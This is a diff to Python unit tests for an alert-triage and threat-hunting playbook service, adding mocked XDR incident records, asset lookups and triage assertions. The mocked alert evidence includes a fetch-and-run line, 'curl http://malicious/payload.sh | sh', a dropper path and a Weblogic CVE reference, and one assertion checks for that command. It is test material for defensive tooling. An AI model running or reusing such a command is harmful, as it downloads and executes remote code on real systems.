@@ -7,7 +7,7 @@ from unittest.mock import patch
 from sqlmodel import Session, delete
 
 from app.core.db import engine, init_db
-from app.models.db_models import PlaybookRun
+from app.models.db_models import CoreAsset, PlaybookRun
 from app.playbook.service import playbook_service
 
 
@@ -30,6 +30,40 @@ class PlaybookRequester:
             return {"code": "Success", "data": {"total": 66}}
 
         if path == "/api/xdr/v1/incidents/list":
+            incident_records = {
+                "incident-real-001": {
+                    "uuId": "incident-real-001",
+                    "name": "异常横向移动告警",
+                    "incidentSeverity": 3,
+                    "dealStatus": 0,
+                    "hostIp": "10.10.0.2",
+                    "endTime": 1739999900,
+                    "riskTag": ["Weblogic"],
+                    "hostGroups": ["生产"],
+                },
+                "incident-real-002": {
+                    "uuId": "incident-real-002",
+                    "name": "疑似C2通信活动",
+                    "incidentSeverity": 4,
+                    "dealStatus": 0,
+                    "hostIp": "10.10.0.3",
+                    "endTime": 1739999800,
+                    "riskTag": ["C2"],
+                    "hostGroups": ["办公"],
+                },
+                "incident-hunt-001": {
+                    "uuId": "incident-hunt-001",
+                    "name": "疑似外联",
+                    "incidentSeverity": 3,
+                    "dealStatus": 0,
+                    "hostIp": "8.8.8.8",
+                    "description": "src ip 8.8.8.8",
+                    "endTime": 1739999900,
+                },
+            }
+            if body.get("uuIds"):
+                items = [incident_records[uid] for uid in body.get("uuIds", []) if uid in incident_records]
+                return {"code": "Success", "data": {"total": len(items), "item": items}}
             page_size = body.get("pageSize", 50)
             page = body.get("page", 1)
             if body.get("dealStatus") == [0] and body.get("severities") == [3, 4]:
@@ -38,22 +72,8 @@ class PlaybookRequester:
                     "data": {
                         "total": 509,
                         "item": [
-                            {
-                                "uuId": "incident-real-001",
-                                "name": "异常横向移动告警",
-                                "incidentSeverity": 3,
-                                "dealStatus": 0,
-                                "hostIp": "10.10.0.2",
-                                "endTime": 1739999900,
-                            },
-                            {
-                                "uuId": "incident-real-002",
-                                "name": "疑似C2通信活动",
-                                "incidentSeverity": 4,
-                                "dealStatus": 0,
-                                "hostIp": "10.10.0.3",
-                                "endTime": 1739999800,
-                            },
+                            incident_records["incident-real-001"],
+                            incident_records["incident-real-002"],
                         ],
                     },
                 }
@@ -63,40 +83,13 @@ class PlaybookRequester:
                 return {
                     "code": "Success",
                     "data": {
-                        "item": [
-                            {
-                                "uuId": "incident-hunt-001",
-                                "name": "疑似外联",
-                                "incidentSeverity": 3,
-                                "dealStatus": 0,
-                                "hostIp": "8.8.8.8",
-                                "description": "src ip 8.8.8.8",
-                                "endTime": 1739999900,
-                            }
-                        ]
+                        "item": [incident_records["incident-hunt-001"]]
                     },
                 }
             return {
                 "code": "Success",
                 "data": {
-                    "item": [
-                        {
-                            "uuId": "incident-real-001",
-                            "name": "异常横向移动告警",
-                            "incidentSeverity": 3,
-                            "dealStatus": 0,
-                            "hostIp": "10.10.0.2",
-                            "endTime": 1739999900,
-                        },
-                        {
-                            "uuId": "incident-real-002",
-                            "name": "疑似C2通信活动",
-                            "incidentSeverity": 4,
-                            "dealStatus": 0,
-                            "hostIp": "10.10.0.3",
-                            "endTime": 1739999800,
-                        },
-                    ]
+                    "item": [incident_records["incident-real-001"], incident_records["incident-real-002"]],
                 },
             }
 
@@ -215,9 +208,39 @@ class PlaybookRequester:
             uid = path.split("/")[-2]
             record = {
                 "name": f"{uid}-proof",
-                "gptResultDescription": "测试研判",
-                "riskTag": ["c2"],
-                "alertTimeLine": [{"name": "x", "severity": 3, "stage": "利用", "lastTime": 1739999000}],
+                "gptResultDescription": "攻击者利用 Weblogic 漏洞尝试执行命令，并伴随内网扩散迹象。",
+                "riskTag": ["c2", "webshell"],
+                "mitreIds": ["T1190", "T1059"],
+                "vulInfo": "Weblogic 远程命令执行漏洞",
+                "cve": "CVE-2020-14882",
+                "vulType": "命令执行",
+                "alertTimeLine": [
+                    {
+                        "name": "突破利用",
+                        "severity": 90,
+                        "stage": "遭受攻击",
+                        "lastTime": 1739999000,
+                        "proof": {
+                            "srcIps": ["8.8.8.8"],
+                            "dstIps": ["10.10.0.2"],
+                            "attackResult": 1,
+                            "cmdLine": "curl http://malicious/payload.sh | sh",
+                            "url": ["http://malicious/payload.sh"],
+                            "fileMd5": ["82713bc7177862a0d804e6059c8920ef"],
+                        },
+                    },
+                    {
+                        "name": "内网扩散",
+                        "severity": 85,
+                        "stage": "内网扩散",
+                        "lastTime": 1739999100,
+                        "proof": {
+                            "srcIps": ["10.10.0.2"],
+                            "dstIps": ["10.10.0.9"],
+                            "path": "/tmp/dropper.sh",
+                        },
+                    },
+                ],
             }
             return {
                 "code": "Success",
@@ -229,10 +252,41 @@ class PlaybookRequester:
                 "code": "Success",
                 "data": {
                     "item": [
-                        {"ip": "8.8.8.8", "country": "US", "province": "CA", "dealSuggestion": "建议封禁"},
+                        {
+                            "ip": "8.8.8.8",
+                            "country": "US",
+                            "province": "CA",
+                            "location": "美国 加州",
+                            "dealSuggestion": "建议封禁",
+                            "intelligenceTag": ["僵尸网络", "C2服务器"],
+                            "mappingTag": "Tor出口",
+                            "alertRole": "攻击源",
+                        },
                     ]
                 },
             }
+
+        if path == "/api/xdr/v1/assets/list":
+            ip_filter = str(body.get("ip") or "")
+            if ip_filter == "=10.10.0.2":
+                return {
+                    "code": "Success",
+                    "data": [
+                        {
+                            "assetId": 1984925,
+                            "assetName": "核心用户数据库",
+                            "hostName": "PRD-DB-USER-01",
+                            "ip": "10.10.0.2",
+                            "magnitude": "core",
+                            "system": "Linux",
+                            "classifyName": "服务器",
+                            "tags": ["生产", "数据库"],
+                            "user": ["DBA"],
+                            "sourceDevice": ["CWPP"],
+                        }
+                    ],
+                }
+            return {"code": "Success", "data": []}
 
         return {"code": "Failed", "message": f"unhandled path: {path}", "data": {}}
 
@@ -273,6 +327,7 @@ class PlaybookServiceTest(unittest.TestCase):
     def setUp(self):
         with Session(engine) as session:
             session.exec(delete(PlaybookRun))
+            session.exec(delete(CoreAsset))
             session.commit()
 
     def _wait_run_finished(self, session: Session, run_id: int, timeout_seconds: float = 8.0) -> PlaybookRun:
@@ -339,6 +394,18 @@ class PlaybookServiceTest(unittest.TestCase):
                 self.assertTrue(rows)
                 self.assertIn("src_total", rows[0])
                 self.assertIn("dst_total", rows[0])
+                triage_view = result.get("triage_view", {})
+                self.assertEqual(triage_view.get("header", {}).get("incident_name"), "异常横向移动告警")
+                self.assertEqual(triage_view.get("attacker", {}).get("ip"), "8.8.8.8")
+                self.assertEqual(triage_view.get("victim", {}).get("host_name"), "PRD-DB-USER-01")
+                self.assertEqual(triage_view.get("victim", {}).get("asset_role"), "核心用户数据库")
+                self.assertEqual(triage_view.get("victim", {}).get("asset_value"), "极高 (核心资产)")
+                self.assertIn("CVE-2020-14882", triage_view.get("victim", {}).get("vulnerability", ""))
+                self.assertTrue(triage_view.get("risk", {}).get("lateral_movement"))
+                self.assertEqual(triage_view.get("risk", {}).get("authenticity"), "极高")
+                self.assertTrue(triage_view.get("tactics", {}).get("mitre"))
+                self.assertIn("curl http://malicious/payload.sh | sh", triage_view.get("payload", {}).get("raw_text", ""))
+                self.assertIn("攻击真实性概率", result.get("summary", ""))
 
         payloads = fake_requester.count_payloads
         self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] for p in payloads))
@@ -425,6 +492,10 @@ class PlaybookServiceTest(unittest.TestCase):
                 result = payload.get("result", {})
                 self.assertIn("summary", result)
                 self.assertGreaterEqual(len(result.get("cards", [])), 3)
+                trend = result.get("asset_guard_view", {}).get("trend", {})
+                self.assertEqual(len(trend.get("labels", [])), 7)
+                self.assertEqual(len(trend.get("inbound", [])), 7)
+                self.assertEqual(len(trend.get("outbound", [])), 7)
                 next_actions = result.get("next_actions", [])
                 self.assertTrue(next_actions)
                 self.assertTrue(all(action.get("template_id") == "alert_triage" for action in next_actions))
@@ -513,6 +584,15 @@ class PlaybookServiceTest(unittest.TestCase):
                 routine_final = self._wait_run_finished(session, routine_run.id)
                 self.assertEqual(routine_final.status, "Finished")
 
+                triage_run = playbook_service.start_run(
+                    session,
+                    template_id="alert_triage",
+                    params={"incident_uuid": "incident-real-001"},
+                    session_id="s-proof-dict-triage",
+                )
+                triage_final = self._wait_run_finished(session, triage_run.id)
+                self.assertEqual(triage_final.status, "Finished")
+
                 hunting_run = playbook_service.start_run(
                     session,
                     template_id="threat_hunting",
@@ -521,6 +601,23 @@ class PlaybookServiceTest(unittest.TestCase):
                 )
                 hunting_final = self._wait_run_finished(session, hunting_run.id)
                 self.assertEqual(hunting_final.status, "Finished")
+
+    def test_triage_assessment_keeps_low_risk_consistent(self):
+        assessment = playbook_service._build_triage_assessment(
+            confidence_num=12,
+            impact_high=0,
+            impact_success=0,
+            attack_success_count=0,
+            boundary_breached=False,
+            lateral_observed=False,
+            risk_tags=[],
+            mitre_ids=[],
+            payload_lines=[],
+            ai_results=["AI分析无异常"],
+        )
+        self.assertEqual(assessment.get("authenticity"), "较低")
+        self.assertEqual(assessment.get("recommendation"), "归档告警，无需进一步处置")
+        self.assertIn("无MITRE攻击技术匹配", assessment.get("key_evidence", ""))
 
 
 if __name__ == "__main__":
